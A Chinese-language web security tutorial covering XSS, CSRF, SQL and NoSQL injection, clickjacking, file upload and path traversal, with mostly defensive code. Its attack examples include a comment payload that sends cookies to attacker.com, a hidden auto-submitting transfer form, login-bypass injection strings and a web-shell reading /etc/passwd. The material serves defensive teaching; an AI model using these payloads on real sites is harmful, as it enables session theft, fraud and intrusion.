---
title: 'Web安全基础：XSS、CSRF、SQL注入防护实战'
description: '全面掌握Web安全核心漏洞原理与防御方案，构建安全的Web应用'
date: '2026-02-23'
tags: ['Web安全', 'XSS', 'CSRF', 'SQL注入', '安全']
authors: ['rownix']
draft: false
---

> **TL;DR**: 深入理解XSS、CSRF、SQL注入等核心安全漏洞，掌握防御策略和最佳实践。

## OWASP Top 10 概览

```
2021年OWASP Top 10:
┌────┬─────────────────────────────┬─────────────────┐
│ 排名 │ 漏洞类型                     │ 风险等级        │
├────┼─────────────────────────────┼─────────────────┤
│ 1  │ 访问控制失效                 │ 🔴 严重         │
│ 2  │ 加密机制失效                 │ 🔴 严重         │
│ 3  │ 注入攻击 (SQL/NoSQL)         │ 🔴 严重         │
│ 4  │ 不安全设计                   │ 🟠 高危         │
│ 5  │ 安全配置错误                 │ 🟠 高危         │
│ 6  │ 易受攻击和过时组件            │ 🟠 高危         │
│ 7  │ 身份识别和认证失效            │ 🟠 高危         │
│ 8  │ 软件和数据完整性失效          │ 🟡 中等         │
│ 9  │ 安全日志和监控失效            │ 🟡 中等         │
│ 10 │ 服务器端请求伪造 (SSRF)       │ 🟡 中等         │
└────┴─────────────────────────────┴─────────────────┘
```

## XSS (跨站脚本攻击)

### 攻击原理

```javascript
// 攻击场景1: 反射型XSS
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>
// 页面直接输出用户输入:
document.write(`搜索结果: ${location.search.split('=')[1]}`)
// 结果: 执行恶意脚本

// 攻击场景2: 存储型XSS
// 用户提交评论:
// 评论内容: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
// 其他用户查看评论时，Cookie被盗

// 攻击场景3: DOM型XSS
// 页面代码:
const hash = location.hash.slice(1)
eval(hash)  // #alert(1)
```

### 防御方案

```javascript
// ❌ 错误示例: 直接插入HTML
function displayUserInput(input) {
  document.getElementById('output').innerHTML = input
}

// ✅ 正确做法1: 使用textContent
function displayUserInput(input) {
  document.getElementById('output').textContent = input
}

// ✅ 正确做法2: 转义HTML
function escapeHtml(text) {
  const div = document.createElement('div')
  div.textContent = text
  return div.innerHTML
}

// ✅ 正确做法3: DOMPurify库
import DOMPurify from 'dompurify'

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title']
})
```

### Content Security Policy (CSP)

```http
# HTTP响应头
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```javascript
// 报告模式 (先监控后执行)
Content-Security-Policy-Report-Only: ...; report-uri /csp-report

// 上报违规
app.post('/csp-report', (req, res) => {
  console.log('CSP违规:', req.body)
  // 记录到安全日志
  securityLogger.warn('CSP Violation', req.body)
})
```

### Cookie安全设置

```javascript
// Express设置安全Cookie
res.cookie('sessionId', token, {
  httpOnly: true,      // 禁止JavaScript访问
  secure: true,        // 仅HTTPS传输
  sameSite: 'strict',  // 防止CSRF
  maxAge: 3600000,     // 1小时过期
  domain: '.example.com'
})

// 现代浏览器: Cookie前缀
// __Host-: 强制secure, 禁止Domain属性, Path=/
// __Secure-: 强制secure
res.setHeader('Set-Cookie', 
  '__Host-sessionId=' + token + '; Path=/; Secure; HttpOnly; SameSite=Strict'
)
```

## CSRF (跨站请求伪造)

### 攻击原理

```html
<!-- 攻击者页面 (evil.com) -->
<body>
  <!-- 用户已登录bank.com，Cookie自动携带 -->
  <form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>document.getElementById('csrf').submit()</script>
</body>
```

```javascript
// 图片标签攻击 (GET请求)
<img src="https://bank.com/delete-account?id=123" width="0" height="0">

// AJAX攻击 (CORS预检失败，但简单请求可成功)
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // 携带Cookie
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to=attacker&amount=10000'
})
```

### 防御方案

```javascript
// ✅ 方案1: CSRF Token
// 服务端生成Token
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex')
  req.session.csrfToken = csrfToken
  
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input type="text" name="to" placeholder="收款人">
      <input type="number" name="amount" placeholder="金额">
      <button type="submit">转账</button>
    </form>
  `)
})

// 验证Token
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF Token无效')
  }
  // 处理转账...
})
```

```javascript
// ✅ 方案2: SameSite Cookie
// 现代浏览器默认支持
res.cookie('sessionId', token, {
  sameSite: 'strict'  // 完全禁止第三方Cookie
  // sameSite: 'lax'   // 允许顶层导航GET请求
})

// ✅ 方案3: 双重Cookie验证
// 服务端设置: Set-Cookie: csrfToken=abc123; SameSite=Strict
// 请求时读取Cookie并添加到请求头
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')  // 从Cookie读取
  },
  body: JSON.stringify(data)
})

// 服务端验证
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-csrf-token'] !== req.cookies.csrfToken) {
    return res.status(403).send('Invalid CSRF token')
  }
})
```

```javascript
// ✅ 方案4: 验证Origin/Referer
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  const allowedOrigins = ['https://example.com', 'https://app.example.com']
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).send('非法来源')
  }
  next()
})
```

## SQL注入

### 攻击原理

```javascript
// ❌ 错误示例: 字符串拼接SQL
app.get('/user', async (req, res) => {
  const id = req.query.id
  const sql = `SELECT * FROM users WHERE id = ${id}`
  // 攻击: ?id=1 OR 1=1 --
  // 结果: SELECT * FROM users WHERE id = 1 OR 1=1 --
  // 返回所有用户！
  
  const users = await db.query(sql)
  res.json(users)
})

// ❌ 错误示例: 登录绕过
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
// 攻击: username = admin' --
// 结果: SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx'
// 注释掉密码验证，直接登录admin！
```

### 防御方案

```javascript
// ✅ 方案1: 参数化查询 (Prepared Statements)
// Node.js + mysql2
const [rows] = await pool.execute(
  'SELECT * FROM users WHERE id = ? AND status = ?',
  [userId, 'active']
)

// ✅ 方案2: ORM框架
// Prisma
const user = await prisma.user.findUnique({
  where: { id: parseInt(userId) }
})

// Sequelize
const user = await User.findByPk(userId)

// ✅ 方案3: 输入验证
import { z } from 'zod'

const userIdSchema = z.number().int().positive().max(1000000)

app.get('/user/:id', async (req, res) => {
  const result = userIdSchema.safeParse(parseInt(req.params.id))
  if (!result.success) {
    return res.status(400).json({ error: '无效的用户ID' })
  }
  // 继续处理...
})
```

### NoSQL注入防护

```javascript
// ❌ MongoDB注入风险
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
})
// 攻击: {"username": {"$ne": null}, "password": {"$ne": null}}
// 绕过登录！

// ✅ 正确做法
import { ObjectId } from 'mongodb'

// 验证ObjectId
if (!ObjectId.isValid(id)) {
  throw new Error('Invalid ID')
}
const doc = await collection.findOne({ _id: new ObjectId(id) })

// 使用严格模式查询
const user = await db.collection('users').findOne({
  username: String(req.body.username),
  password: hashPassword(req.body.password)  // 必须哈希
})
```

## 其他常见攻击

### 1. 点击劫持 (Clickjacking)

```javascript
// 攻击: 将目标网站嵌入透明iframe
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:100px; left:100px;">点击领取奖励</button>
// 用户点击"奖励"按钮，实际点击了转账按钮
```

```http
# 防御: X-Frame-Options
X-Frame-Options: DENY                    # 完全禁止嵌入
X-Frame-Options: SAMEORIGIN              # 仅同域可嵌入

# 或CSP
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

### 2. 文件上传漏洞

```javascript
// ❌ 危险: 直接保存用户上传文件
app.post('/upload', upload.single('file'), (req, res) => {
  fs.writeFileSync(`./uploads/${req.file.originalname}`, req.file.buffer)
  // 攻击者上传: shell.php
  // 访问: /uploads/shell.php?cmd=cat /etc/passwd
})

// ✅ 安全做法
import path from 'path'
import crypto from 'crypto'
import { fileTypeFromBuffer } from 'file-type'

app.post('/upload', async (req, res) => {
  // 1. 验证文件类型 (不要信任文件名)
  const fileType = await fileTypeFromBuffer(req.file.buffer)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp']
  
  if (!allowedTypes.includes(fileType?.mime)) {
    return res.status(400).send('不支持的文件类型')
  }
  
  // 2. 重命名文件 (去掉原始文件名)
  const ext = path.extname(req.file.originalname)
  const filename = crypto.randomUUID() + ext
  
  // 3. 保存到非Web目录
  await fs.writeFile(`./private-uploads/${filename}`, req.file.buffer)
  
  // 4. 返回文件ID而非路径
  res.json({ fileId: filename })
})

// 图片访问通过代理，添加水印/鉴权
app.get('/image/:id', authenticate, async (req, res) => {
  const filePath = `./private-uploads/${req.params.id}`
  // 验证文件存在、用户权限...
  res.sendFile(filePath)
})
```

### 3. 路径遍历 (Path Traversal)

```javascript
// ❌ 危险
const filePath = `./files/${req.query.filename}`
// 攻击: ?filename=../../../etc/passwd
// 结果: ./files/../../../etc/passwd → /etc/passwd

// ✅ 安全做法
import path from 'path'

const BASE_DIR = path.resolve('./files')
const requestedPath = path.resolve(BASE_DIR, req.query.filename)

// 确保在基础目录内
if (!requestedPath.startsWith(BASE_DIR)) {
  return res.status(403).send('非法路径')
}

// 或使用白名单
const allowedFiles = ['report.pdf', 'data.csv', 'readme.txt']
if (!allowedFiles.includes(req.query.filename)) {
  return res.status(403).send('文件不存在')
}
```

## 安全开发最佳实践

### 1. 依赖安全检查

```bash
# 检查已知漏洞
npm audit
npm audit fix

# 或使用Snyk
npx snyk test
npx snyk monitor

# 添加pre-commit检查
# .husky/pre-commit
npm audit --audit-level=moderate
```

### 2. 安全Headers中间件

```javascript
// Express + helmet
import helmet from 'helmet'

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}))

// 手动设置关键Headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-Frame-Options', 'DENY')
  res.setHeader('X-XSS-Protection', '1; mode=block')
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()')
  next()
})
```

### 3. 输入验证与输出编码

```javascript
// 使用Zod进行严格验证
import { z } from 'zod'

const userSchema = z.object({
  username: z.string().min(3).max(20).regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email(),
  age: z.number().int().min(0).max(150),
  role: z.enum(['user', 'admin'])
})

app.post('/register', async (req, res) => {
  const result = userSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ 
      error: '输入验证失败',
      details: result.error.issues 
    })
  }
  
  // 使用验证后的数据
  const user = await createUser(result.data)
  res.json(user)
})
```

### 4. 错误处理

```javascript
// ❌ 危险: 泄露敏感信息
app.get('/user/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)
    res.json(user)
  } catch (error) {
    // 泄露数据库结构！
    res.status(500).send(error.message)  // "Table 'users' doesn't exist"
  }
})

// ✅ 安全做法
app.use((err, req, res, next) => {
  // 记录完整错误到日志
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    user: req.user?.id
  })
  
  // 返回通用错误给用户
  res.status(500).json({
    error: '服务器内部错误',
    requestId: req.id  // 用于日志关联
  })
})
```

## 安全测试工具

```bash
# 1. 依赖漏洞扫描
npm audit
snyk test

# 2. 静态代码分析 (SAST)
eslint-plugin-security
semgrep

# 3. 动态测试 (DAST)
# OWASP ZAP
zap-baseline.py -t https://example.com

# 4. 渗透测试工具
# Burp Suite, sqlmap, nmap

# 5. 容器安全扫描
trivy image myapp:latest
```

---

**你在开发中遇到过哪些安全问题？欢迎分享经验！** 👇
